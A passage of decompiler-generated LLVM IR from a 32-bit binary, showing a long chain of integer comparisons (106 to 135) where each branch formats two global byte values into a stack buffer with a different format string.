  store i32 %v2_804b07d, i32* @ebx, align 4
  %v5_804b084 = call i32 @szprintf(i32 %v2_804b07d, i32 ptrtoint ([13 x i8]* @global_var_8057fcc.141 to i32), i32 %v1_804b06e, i32 %v1_804b062)
  br label %dec_label_pc_804b08c

dec_label_pc_804b08c:                             ; preds = %dec_label_pc_804b05c, %dec_label_pc_804b062
  %v12_804b08c = icmp eq i32 %v11_8049ca7, 106
  %v1_804b090 = icmp eq i1 %v12_804b08c, false
  br i1 %v1_804b090, label %dec_label_pc_804b0bc, label %dec_label_pc_804b092

dec_label_pc_804b092:                             ; preds = %dec_label_pc_804b08c
  %v0_804b092 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b092 = zext i8 %v0_804b092 to i32
  store i32 %v1_804b092, i32* @edx, align 4
  %v0_804b09e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b09e = zext i8 %v0_804b09e to i32
  %v2_804b0ad = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b0ad, i32* @ebx, align 4
  %v5_804b0b4 = call i32 @szprintf(i32 %v2_804b0ad, i32 ptrtoint ([12 x i8]* @global_var_8057fd9.142 to i32), i32 %v1_804b09e, i32 %v1_804b092)
  br label %dec_label_pc_804b0bc

dec_label_pc_804b0bc:                             ; preds = %dec_label_pc_804b08c, %dec_label_pc_804b092
  %v12_804b0bc = icmp eq i32 %v11_8049ca7, 107
  %v1_804b0c0 = icmp eq i1 %v12_804b0bc, false
  br i1 %v1_804b0c0, label %dec_label_pc_804b0ec, label %dec_label_pc_804b0c2

dec_label_pc_804b0c2:                             ; preds = %dec_label_pc_804b0bc
  %v0_804b0c2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b0c2 = zext i8 %v0_804b0c2 to i32
  store i32 %v1_804b0c2, i32* @edx, align 4
  %v0_804b0ce = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b0ce = zext i8 %v0_804b0ce to i32
  %v2_804b0dd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b0dd, i32* @ebx, align 4
  %v5_804b0e4 = call i32 @szprintf(i32 %v2_804b0dd, i32 ptrtoint ([14 x i8]* @global_var_8057fe5.143 to i32), i32 %v1_804b0ce, i32 %v1_804b0c2)
  br label %dec_label_pc_804b0ec

dec_label_pc_804b0ec:                             ; preds = %dec_label_pc_804b0bc, %dec_label_pc_804b0c2
  %v12_804b0ec = icmp eq i32 %v11_8049ca7, 108
  %v1_804b0f0 = icmp eq i1 %v12_804b0ec, false
  br i1 %v1_804b0f0, label %dec_label_pc_804b11c, label %dec_label_pc_804b0f2

dec_label_pc_804b0f2:                             ; preds = %dec_label_pc_804b0ec
  %v0_804b0f2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b0f2 = zext i8 %v0_804b0f2 to i32
  store i32 %v1_804b0f2, i32* @edx, align 4
  %v0_804b0fe = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b0fe = zext i8 %v0_804b0fe to i32
  %v2_804b10d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b10d, i32* @ebx, align 4
  %v5_804b114 = call i32 @szprintf(i32 %v2_804b10d, i32 ptrtoint ([15 x i8]* @global_var_8057ff3.144 to i32), i32 %v1_804b0fe, i32 %v1_804b0f2)
  br label %dec_label_pc_804b11c

dec_label_pc_804b11c:                             ; preds = %dec_label_pc_804b0ec, %dec_label_pc_804b0f2
  %v12_804b11c = icmp eq i32 %v11_8049ca7, 109
  %v1_804b120 = icmp eq i1 %v12_804b11c, false
  br i1 %v1_804b120, label %dec_label_pc_804b14c, label %dec_label_pc_804b122

dec_label_pc_804b122:                             ; preds = %dec_label_pc_804b11c
  %v0_804b122 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b122 = zext i8 %v0_804b122 to i32
  store i32 %v1_804b122, i32* @edx, align 4
  %v0_804b12e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b12e = zext i8 %v0_804b12e to i32
  %v2_804b13d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b13d, i32* @ebx, align 4
  %v5_804b144 = call i32 @szprintf(i32 %v2_804b13d, i32 ptrtoint ([14 x i8]* @global_var_8058002.145 to i32), i32 %v1_804b12e, i32 %v1_804b122)
  br label %dec_label_pc_804b14c

dec_label_pc_804b14c:                             ; preds = %dec_label_pc_804b11c, %dec_label_pc_804b122
  %v12_804b14c = icmp eq i32 %v11_8049ca7, 110
  %v1_804b150 = icmp eq i1 %v12_804b14c, false
  br i1 %v1_804b150, label %dec_label_pc_804b17c, label %dec_label_pc_804b152

dec_label_pc_804b152:                             ; preds = %dec_label_pc_804b14c
  %v0_804b152 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b152 = zext i8 %v0_804b152 to i32
  store i32 %v1_804b152, i32* @edx, align 4
  %v0_804b15e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b15e = zext i8 %v0_804b15e to i32
  %v2_804b16d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b16d, i32* @ebx, align 4
  %v5_804b174 = call i32 @szprintf(i32 %v2_804b16d, i32 ptrtoint ([13 x i8]* @global_var_8058010.146 to i32), i32 %v1_804b15e, i32 %v1_804b152)
  br label %dec_label_pc_804b17c

dec_label_pc_804b17c:                             ; preds = %dec_label_pc_804b14c, %dec_label_pc_804b152
  %v12_804b17c = icmp eq i32 %v11_8049ca7, 111
  %v1_804b180 = icmp eq i1 %v12_804b17c, false
  br i1 %v1_804b180, label %dec_label_pc_804b1ac, label %dec_label_pc_804b182

dec_label_pc_804b182:                             ; preds = %dec_label_pc_804b17c
  %v0_804b182 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b182 = zext i8 %v0_804b182 to i32
  store i32 %v1_804b182, i32* @edx, align 4
  %v0_804b18e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b18e = zext i8 %v0_804b18e to i32
  %v2_804b19d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b19d, i32* @ebx, align 4
  %v5_804b1a4 = call i32 @szprintf(i32 %v2_804b19d, i32 ptrtoint ([14 x i8]* @global_var_805801d.147 to i32), i32 %v1_804b18e, i32 %v1_804b182)
  br label %dec_label_pc_804b1ac

dec_label_pc_804b1ac:                             ; preds = %dec_label_pc_804b17c, %dec_label_pc_804b182
  %v9_804b1ac = icmp eq i32 %v11_8049ca7, 112
  %v1_804b1b0 = icmp eq i1 %v9_804b1ac, false
  br i1 %v1_804b1b0, label %dec_label_pc_804b1dc, label %dec_label_pc_804b1b2

dec_label_pc_804b1b2:                             ; preds = %dec_label_pc_804b1ac
  %v0_804b1b2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b1b2 = zext i8 %v0_804b1b2 to i32
  store i32 %v1_804b1b2, i32* @edx, align 4
  %v0_804b1be = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b1be = zext i8 %v0_804b1be to i32
  %v2_804b1cd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b1cd, i32* @ebx, align 4
  %v5_804b1d4 = call i32 @szprintf(i32 %v2_804b1cd, i32 ptrtoint ([15 x i8]* @global_var_805802b.148 to i32), i32 %v1_804b1be, i32 %v1_804b1b2)
  br label %dec_label_pc_804b1dc

dec_label_pc_804b1dc:                             ; preds = %dec_label_pc_804b1ac, %dec_label_pc_804b1b2
  %v12_804b1dc = icmp eq i32 %v11_8049ca7, 113
  %v1_804b1e0 = icmp eq i1 %v12_804b1dc, false
  br i1 %v1_804b1e0, label %dec_label_pc_804b20c, label %dec_label_pc_804b1e2

dec_label_pc_804b1e2:                             ; preds = %dec_label_pc_804b1dc
  %v0_804b1e2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b1e2 = zext i8 %v0_804b1e2 to i32
  store i32 %v1_804b1e2, i32* @edx, align 4
  %v0_804b1ee = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b1ee = zext i8 %v0_804b1ee to i32
  %v2_804b1fd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b1fd, i32* @ebx, align 4
  %v5_804b204 = call i32 @szprintf(i32 %v2_804b1fd, i32 ptrtoint ([13 x i8]* @global_var_805803a.149 to i32), i32 %v1_804b1ee, i32 %v1_804b1e2)
  br label %dec_label_pc_804b20c

dec_label_pc_804b20c:                             ; preds = %dec_label_pc_804b1dc, %dec_label_pc_804b1e2
  %v12_804b20c = icmp eq i32 %v11_8049ca7, 114
  %v1_804b210 = icmp eq i1 %v12_804b20c, false
  br i1 %v1_804b210, label %dec_label_pc_804b23c, label %dec_label_pc_804b212

dec_label_pc_804b212:                             ; preds = %dec_label_pc_804b20c
  %v0_804b212 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b212 = zext i8 %v0_804b212 to i32
  store i32 %v1_804b212, i32* @edx, align 4
  %v0_804b21e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b21e = zext i8 %v0_804b21e to i32
  %v2_804b22d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b22d, i32* @ebx, align 4
  %v5_804b234 = call i32 @szprintf(i32 %v2_804b22d, i32 ptrtoint ([14 x i8]* @global_var_8058047.150 to i32), i32 %v1_804b21e, i32 %v1_804b212)
  br label %dec_label_pc_804b23c

dec_label_pc_804b23c:                             ; preds = %dec_label_pc_804b20c, %dec_label_pc_804b212
  %v12_804b23c = icmp eq i32 %v11_8049ca7, 115
  %v1_804b240 = icmp eq i1 %v12_804b23c, false
  br i1 %v1_804b240, label %dec_label_pc_804b26c, label %dec_label_pc_804b242

dec_label_pc_804b242:                             ; preds = %dec_label_pc_804b23c
  %v0_804b242 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b242 = zext i8 %v0_804b242 to i32
  store i32 %v1_804b242, i32* @edx, align 4
  %v0_804b24e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b24e = zext i8 %v0_804b24e to i32
  %v2_804b25d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b25d, i32* @ebx, align 4
  %v5_804b264 = call i32 @szprintf(i32 %v2_804b25d, i32 ptrtoint ([13 x i8]* @global_var_8058055.151 to i32), i32 %v1_804b24e, i32 %v1_804b242)
  br label %dec_label_pc_804b26c

dec_label_pc_804b26c:                             ; preds = %dec_label_pc_804b23c, %dec_label_pc_804b242
  %v12_804b26c = icmp eq i32 %v11_8049ca7, 116
  %v1_804b270 = icmp eq i1 %v12_804b26c, false
  br i1 %v1_804b270, label %dec_label_pc_804b29c, label %dec_label_pc_804b272

dec_label_pc_804b272:                             ; preds = %dec_label_pc_804b26c
  %v0_804b272 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b272 = zext i8 %v0_804b272 to i32
  store i32 %v1_804b272, i32* @edx, align 4
  %v0_804b27e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b27e = zext i8 %v0_804b27e to i32
  %v2_804b28d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b28d, i32* @ebx, align 4
  %v5_804b294 = call i32 @szprintf(i32 %v2_804b28d, i32 ptrtoint ([13 x i8]* @global_var_8058062.152 to i32), i32 %v1_804b27e, i32 %v1_804b272)
  br label %dec_label_pc_804b29c

dec_label_pc_804b29c:                             ; preds = %dec_label_pc_804b26c, %dec_label_pc_804b272
  %v12_804b29c = icmp eq i32 %v11_8049ca7, 117
  %v1_804b2a0 = icmp eq i1 %v12_804b29c, false
  br i1 %v1_804b2a0, label %dec_label_pc_804b2cc, label %dec_label_pc_804b2a2

dec_label_pc_804b2a2:                             ; preds = %dec_label_pc_804b29c
  %v0_804b2a2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b2a2 = zext i8 %v0_804b2a2 to i32
  store i32 %v1_804b2a2, i32* @edx, align 4
  %v0_804b2ae = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b2ae = zext i8 %v0_804b2ae to i32
  %v2_804b2bd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b2bd, i32* @ebx, align 4
  %v5_804b2c4 = call i32 @szprintf(i32 %v2_804b2bd, i32 ptrtoint ([14 x i8]* @global_var_805806f.153 to i32), i32 %v1_804b2ae, i32 %v1_804b2a2)
  br label %dec_label_pc_804b2cc

dec_label_pc_804b2cc:                             ; preds = %dec_label_pc_804b29c, %dec_label_pc_804b2a2
  %v12_804b2cc = icmp eq i32 %v11_8049ca7, 118
  %v1_804b2d0 = icmp eq i1 %v12_804b2cc, false
  br i1 %v1_804b2d0, label %dec_label_pc_804b2fc, label %dec_label_pc_804b2d2

dec_label_pc_804b2d2:                             ; preds = %dec_label_pc_804b2cc
  %v0_804b2d2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b2d2 = zext i8 %v0_804b2d2 to i32
  store i32 %v1_804b2d2, i32* @edx, align 4
  %v0_804b2de = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b2de = zext i8 %v0_804b2de to i32
  %v2_804b2ed = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b2ed, i32* @ebx, align 4
  %v5_804b2f4 = call i32 @szprintf(i32 %v2_804b2ed, i32 ptrtoint ([14 x i8]* @global_var_805807d.154 to i32), i32 %v1_804b2de, i32 %v1_804b2d2)
  br label %dec_label_pc_804b2fc

dec_label_pc_804b2fc:                             ; preds = %dec_label_pc_804b2cc, %dec_label_pc_804b2d2
  %v12_804b2fc = icmp eq i32 %v11_8049ca7, 119
  %v1_804b300 = icmp eq i1 %v12_804b2fc, false
  br i1 %v1_804b300, label %dec_label_pc_804b32c, label %dec_label_pc_804b302

dec_label_pc_804b302:                             ; preds = %dec_label_pc_804b2fc
  %v0_804b302 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b302 = zext i8 %v0_804b302 to i32
  store i32 %v1_804b302, i32* @edx, align 4
  %v0_804b30e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b30e = zext i8 %v0_804b30e to i32
  %v2_804b31d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b31d, i32* @ebx, align 4
  %v5_804b324 = call i32 @szprintf(i32 %v2_804b31d, i32 ptrtoint ([14 x i8]* @global_var_805808b.155 to i32), i32 %v1_804b30e, i32 %v1_804b302)
  br label %dec_label_pc_804b32c

dec_label_pc_804b32c:                             ; preds = %dec_label_pc_804b2fc, %dec_label_pc_804b302
  %v12_804b32c = icmp eq i32 %v11_8049ca7, 120
  %v1_804b330 = icmp eq i1 %v12_804b32c, false
  br i1 %v1_804b330, label %dec_label_pc_804b35c, label %dec_label_pc_804b332

dec_label_pc_804b332:                             ; preds = %dec_label_pc_804b32c
  %v0_804b332 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b332 = zext i8 %v0_804b332 to i32
  store i32 %v1_804b332, i32* @edx, align 4
  %v0_804b33e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b33e = zext i8 %v0_804b33e to i32
  %v2_804b34d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b34d, i32* @ebx, align 4
  %v5_804b354 = call i32 @szprintf(i32 %v2_804b34d, i32 ptrtoint ([15 x i8]* @global_var_8058099.156 to i32), i32 %v1_804b33e, i32 %v1_804b332)
  br label %dec_label_pc_804b35c

dec_label_pc_804b35c:                             ; preds = %dec_label_pc_804b32c, %dec_label_pc_804b332
  %v12_804b35c = icmp eq i32 %v11_8049ca7, 121
  %v1_804b360 = icmp eq i1 %v12_804b35c, false
  br i1 %v1_804b360, label %dec_label_pc_804b38c, label %dec_label_pc_804b362

dec_label_pc_804b362:                             ; preds = %dec_label_pc_804b35c
  %v0_804b362 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b362 = zext i8 %v0_804b362 to i32
  store i32 %v1_804b362, i32* @edx, align 4
  %v0_804b36e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b36e = zext i8 %v0_804b36e to i32
  %v2_804b37d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b37d, i32* @ebx, align 4
  %v5_804b384 = call i32 @szprintf(i32 %v2_804b37d, i32 ptrtoint ([15 x i8]* @global_var_8057ff3.144 to i32), i32 %v1_804b36e, i32 %v1_804b362)
  br label %dec_label_pc_804b38c

dec_label_pc_804b38c:                             ; preds = %dec_label_pc_804b35c, %dec_label_pc_804b362
  %v12_804b38c = icmp eq i32 %v11_8049ca7, 122
  %v1_804b390 = icmp eq i1 %v12_804b38c, false
  br i1 %v1_804b390, label %dec_label_pc_804b3bc, label %dec_label_pc_804b392

dec_label_pc_804b392:                             ; preds = %dec_label_pc_804b38c
  %v0_804b392 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b392 = zext i8 %v0_804b392 to i32
  store i32 %v1_804b392, i32* @edx, align 4
  %v0_804b39e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b39e = zext i8 %v0_804b39e to i32
  %v2_804b3ad = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b3ad, i32* @ebx, align 4
  %v5_804b3b4 = call i32 @szprintf(i32 %v2_804b3ad, i32 ptrtoint ([14 x i8]* @global_var_80580a8.157 to i32), i32 %v1_804b39e, i32 %v1_804b392)
  br label %dec_label_pc_804b3bc

dec_label_pc_804b3bc:                             ; preds = %dec_label_pc_804b38c, %dec_label_pc_804b392
  %v12_804b3bc = icmp eq i32 %v11_8049ca7, 123
  %v1_804b3c0 = icmp eq i1 %v12_804b3bc, false
  br i1 %v1_804b3c0, label %dec_label_pc_804b3ec, label %dec_label_pc_804b3c2

dec_label_pc_804b3c2:                             ; preds = %dec_label_pc_804b3bc
  %v0_804b3c2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b3c2 = zext i8 %v0_804b3c2 to i32
  store i32 %v1_804b3c2, i32* @edx, align 4
  %v0_804b3ce = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b3ce = zext i8 %v0_804b3ce to i32
  %v2_804b3dd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b3dd, i32* @ebx, align 4
  %v5_804b3e4 = call i32 @szprintf(i32 %v2_804b3dd, i32 ptrtoint ([12 x i8]* @global_var_80580b6.158 to i32), i32 %v1_804b3ce, i32 %v1_804b3c2)
  br label %dec_label_pc_804b3ec

dec_label_pc_804b3ec:                             ; preds = %dec_label_pc_804b3bc, %dec_label_pc_804b3c2
  %v12_804b3ec = icmp eq i32 %v11_8049ca7, 124
  %v1_804b3f0 = icmp eq i1 %v12_804b3ec, false
  br i1 %v1_804b3f0, label %dec_label_pc_804b41c, label %dec_label_pc_804b3f2

dec_label_pc_804b3f2:                             ; preds = %dec_label_pc_804b3ec
  %v0_804b3f2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b3f2 = zext i8 %v0_804b3f2 to i32
  store i32 %v1_804b3f2, i32* @edx, align 4
  %v0_804b3fe = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b3fe = zext i8 %v0_804b3fe to i32
  %v2_804b40d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b40d, i32* @ebx, align 4
  %v5_804b414 = call i32 @szprintf(i32 %v2_804b40d, i32 ptrtoint ([14 x i8]* @global_var_80580c2.159 to i32), i32 %v1_804b3fe, i32 %v1_804b3f2)
  br label %dec_label_pc_804b41c

dec_label_pc_804b41c:                             ; preds = %dec_label_pc_804b3ec, %dec_label_pc_804b3f2
  %v12_804b41c = icmp eq i32 %v11_8049ca7, 125
  %v1_804b420 = icmp eq i1 %v12_804b41c, false
  br i1 %v1_804b420, label %dec_label_pc_804b44c, label %dec_label_pc_804b422

dec_label_pc_804b422:                             ; preds = %dec_label_pc_804b41c
  %v0_804b422 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b422 = zext i8 %v0_804b422 to i32
  store i32 %v1_804b422, i32* @edx, align 4
  %v0_804b42e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b42e = zext i8 %v0_804b42e to i32
  %v2_804b43d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b43d, i32* @ebx, align 4
  %v5_804b444 = call i32 @szprintf(i32 %v2_804b43d, i32 ptrtoint ([14 x i8]* @global_var_80580d0.160 to i32), i32 %v1_804b42e, i32 %v1_804b422)
  br label %dec_label_pc_804b44c

dec_label_pc_804b44c:                             ; preds = %dec_label_pc_804b41c, %dec_label_pc_804b422
  %v12_804b44c = icmp eq i32 %v11_8049ca7, 126
  %v1_804b450 = icmp eq i1 %v12_804b44c, false
  br i1 %v1_804b450, label %dec_label_pc_804b47c, label %dec_label_pc_804b452

dec_label_pc_804b452:                             ; preds = %dec_label_pc_804b44c
  %v0_804b452 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b452 = zext i8 %v0_804b452 to i32
  store i32 %v1_804b452, i32* @edx, align 4
  %v0_804b45e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b45e = zext i8 %v0_804b45e to i32
  %v2_804b46d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b46d, i32* @ebx, align 4
  %v5_804b474 = call i32 @szprintf(i32 %v2_804b46d, i32 ptrtoint ([14 x i8]* @global_var_80580c2.159 to i32), i32 %v1_804b45e, i32 %v1_804b452)
  br label %dec_label_pc_804b47c

dec_label_pc_804b47c:                             ; preds = %dec_label_pc_804b44c, %dec_label_pc_804b452
  %v12_804b47c = icmp eq i32 %v11_8049ca7, 127
  %v1_804b480 = icmp eq i1 %v12_804b47c, false
  br i1 %v1_804b480, label %dec_label_pc_804b4ac, label %dec_label_pc_804b482

dec_label_pc_804b482:                             ; preds = %dec_label_pc_804b47c
  %v0_804b482 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b482 = zext i8 %v0_804b482 to i32
  store i32 %v1_804b482, i32* @edx, align 4
  %v0_804b48e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b48e = zext i8 %v0_804b48e to i32
  %v2_804b49d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b49d, i32* @ebx, align 4
  %v5_804b4a4 = call i32 @szprintf(i32 %v2_804b49d, i32 ptrtoint ([14 x i8]* @global_var_80580de.161 to i32), i32 %v1_804b48e, i32 %v1_804b482)
  br label %dec_label_pc_804b4ac

dec_label_pc_804b4ac:                             ; preds = %dec_label_pc_804b47c, %dec_label_pc_804b482
  %v9_804b4ac = icmp eq i32 %v11_8049ca7, 128
  %v1_804b4b3 = icmp eq i1 %v9_804b4ac, false
  br i1 %v1_804b4b3, label %dec_label_pc_804b4df, label %dec_label_pc_804b4b5

dec_label_pc_804b4b5:                             ; preds = %dec_label_pc_804b4ac
  %v0_804b4b5 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b4b5 = zext i8 %v0_804b4b5 to i32
  store i32 %v1_804b4b5, i32* @edx, align 4
  %v0_804b4c1 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b4c1 = zext i8 %v0_804b4c1 to i32
  %v2_804b4d0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b4d0, i32* @ebx, align 4
  %v5_804b4d7 = call i32 @szprintf(i32 %v2_804b4d0, i32 ptrtoint ([14 x i8]* @global_var_80580ec.162 to i32), i32 %v1_804b4c1, i32 %v1_804b4b5)
  br label %dec_label_pc_804b4df

dec_label_pc_804b4df:                             ; preds = %dec_label_pc_804b4ac, %dec_label_pc_804b4b5
  %v12_804b4df = icmp eq i32 %v11_8049ca7, 129
  %v1_804b4e6 = icmp eq i1 %v12_804b4df, false
  br i1 %v1_804b4e6, label %dec_label_pc_804b512, label %dec_label_pc_804b4e8

dec_label_pc_804b4e8:                             ; preds = %dec_label_pc_804b4df
  %v0_804b4e8 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b4e8 = zext i8 %v0_804b4e8 to i32
  store i32 %v1_804b4e8, i32* @edx, align 4
  %v0_804b4f4 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b4f4 = zext i8 %v0_804b4f4 to i32
  %v2_804b503 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b503, i32* @ebx, align 4
  %v5_804b50a = call i32 @szprintf(i32 %v2_804b503, i32 ptrtoint ([14 x i8]* @global_var_80580fa.163 to i32), i32 %v1_804b4f4, i32 %v1_804b4e8)
  br label %dec_label_pc_804b512

dec_label_pc_804b512:                             ; preds = %dec_label_pc_804b4df, %dec_label_pc_804b4e8
  %v12_804b512 = icmp eq i32 %v11_8049ca7, 130
  %v1_804b519 = icmp eq i1 %v12_804b512, false
  br i1 %v1_804b519, label %dec_label_pc_804b545, label %dec_label_pc_804b51b

dec_label_pc_804b51b:                             ; preds = %dec_label_pc_804b512
  %v0_804b51b = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b51b = zext i8 %v0_804b51b to i32
  store i32 %v1_804b51b, i32* @edx, align 4
  %v0_804b527 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b527 = zext i8 %v0_804b527 to i32
  %v2_804b536 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b536, i32* @ebx, align 4
  %v5_804b53d = call i32 @szprintf(i32 %v2_804b536, i32 ptrtoint ([14 x i8]* @global_var_8058108.164 to i32), i32 %v1_804b527, i32 %v1_804b51b)
  br label %dec_label_pc_804b545

dec_label_pc_804b545:                             ; preds = %dec_label_pc_804b512, %dec_label_pc_804b51b
  %v12_804b545 = icmp eq i32 %v11_8049ca7, 131
  %v1_804b54c = icmp eq i1 %v12_804b545, false
  br i1 %v1_804b54c, label %dec_label_pc_804b578, label %dec_label_pc_804b54e

dec_label_pc_804b54e:                             ; preds = %dec_label_pc_804b545
  %v0_804b54e = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b54e = zext i8 %v0_804b54e to i32
  store i32 %v1_804b54e, i32* @edx, align 4
  %v0_804b55a = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b55a = zext i8 %v0_804b55a to i32
  %v2_804b569 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b569, i32* @ebx, align 4
  %v5_804b570 = call i32 @szprintf(i32 %v2_804b569, i32 ptrtoint ([14 x i8]* @global_var_8058116.165 to i32), i32 %v1_804b55a, i32 %v1_804b54e)
  br label %dec_label_pc_804b578

dec_label_pc_804b578:                             ; preds = %dec_label_pc_804b545, %dec_label_pc_804b54e
  %v12_804b578 = icmp eq i32 %v11_8049ca7, 132
  %v1_804b57f = icmp eq i1 %v12_804b578, false
  br i1 %v1_804b57f, label %dec_label_pc_804b5ab, label %dec_label_pc_804b581

dec_label_pc_804b581:                             ; preds = %dec_label_pc_804b578
  %v0_804b581 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b581 = zext i8 %v0_804b581 to i32
  store i32 %v1_804b581, i32* @edx, align 4
  %v0_804b58d = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b58d = zext i8 %v0_804b58d to i32
  %v2_804b59c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b59c, i32* @ebx, align 4
  %v5_804b5a3 = call i32 @szprintf(i32 %v2_804b59c, i32 ptrtoint ([14 x i8]* @global_var_8058124.166 to i32), i32 %v1_804b58d, i32 %v1_804b581)
  br label %dec_label_pc_804b5ab

dec_label_pc_804b5ab:                             ; preds = %dec_label_pc_804b578, %dec_label_pc_804b581
  %v12_804b5ab = icmp eq i32 %v11_8049ca7, 133
  %v1_804b5b2 = icmp eq i1 %v12_804b5ab, false
  br i1 %v1_804b5b2, label %dec_label_pc_804b5de, label %dec_label_pc_804b5b4

dec_label_pc_804b5b4:                             ; preds = %dec_label_pc_804b5ab
  %v0_804b5b4 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b5b4 = zext i8 %v0_804b5b4 to i32
  store i32 %v1_804b5b4, i32* @edx, align 4
  %v0_804b5c0 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b5c0 = zext i8 %v0_804b5c0 to i32
  %v2_804b5cf = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b5cf, i32* @ebx, align 4
  %v5_804b5d6 = call i32 @szprintf(i32 %v2_804b5cf, i32 ptrtoint ([14 x i8]* @global_var_8058132.167 to i32), i32 %v1_804b5c0, i32 %v1_804b5b4)
  br label %dec_label_pc_804b5de

dec_label_pc_804b5de:                             ; preds = %dec_label_pc_804b5ab, %dec_label_pc_804b5b4
  %v12_804b5de = icmp eq i32 %v11_8049ca7, 134
  %v1_804b5e5 = icmp eq i1 %v12_804b5de, false
  br i1 %v1_804b5e5, label %dec_label_pc_804b611, label %dec_label_pc_804b5e7

dec_label_pc_804b5e7:                             ; preds = %dec_label_pc_804b5de
  %v0_804b5e7 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b5e7 = zext i8 %v0_804b5e7 to i32
  store i32 %v1_804b5e7, i32* @edx, align 4
  %v0_804b5f3 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b5f3 = zext i8 %v0_804b5f3 to i32
  %v2_804b602 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b602, i32* @ebx, align 4
  %v5_804b609 = call i32 @szprintf(i32 %v2_804b602, i32 ptrtoint ([14 x i8]* @global_var_8058140.168 to i32), i32 %v1_804b5f3, i32 %v1_804b5e7)
  br label %dec_label_pc_804b611

dec_label_pc_804b611:                             ; preds = %dec_label_pc_804b5de, %dec_label_pc_804b5e7
  %v12_804b611 = icmp eq i32 %v11_8049ca7, 135
  %v1_804b618 = icmp eq i1 %v12_804b611, false
  br i1 %v1_804b618, label %dec_label_pc_804b644, label %dec_label_pc_804b61a

dec_label_pc_804b61a:                             ; preds = %dec_label_pc_804b611
  %v0_804b61a = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b61a = zext i8 %v0_804b61a to i32
  store i32 %v1_804b61a, i32* @edx, align 4
